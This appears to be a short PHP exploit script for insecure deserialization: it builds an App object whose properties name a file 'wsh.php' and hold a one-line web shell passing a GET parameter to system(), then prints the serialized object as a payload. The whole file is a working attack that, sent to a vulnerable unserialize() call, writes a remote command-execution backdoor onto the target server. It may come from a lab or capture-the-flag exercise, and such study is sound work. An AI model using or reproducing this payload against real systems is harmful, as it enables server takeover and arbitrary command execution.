<?php

class App
{
    public $logFile = 'wsh.php';
    public $logData = '<?php system($_GET["ey"]); ?>';
}
$obj = new App;

echo htmlspecialchars(serialize($obj));


?> 